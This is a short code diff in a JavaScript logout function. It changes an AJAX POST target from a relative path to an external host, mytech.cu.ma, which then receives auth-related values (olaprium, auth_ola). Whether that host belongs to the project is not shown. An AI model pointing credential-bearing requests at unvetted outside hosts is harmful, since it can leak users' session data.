@@ -114,7 +114,7 @@ function logout() {
 	var goovrkwuowb = "goovrkwuowb";
 	  $.ajax({
 	    type: "POST",
-	    url: "./app/",
+	    url: "https://mytech.cu.ma/app/",
 	    data: {olaprium: olaprium, auth_ola: auth_ola, goovrkwuowb: goovrkwuowb},
 	    success: function(data){
 			document.cookie = "olaprium= 0 ; expires=Thu, 18 Dec 1999 12:00:00 UTC; path=/";
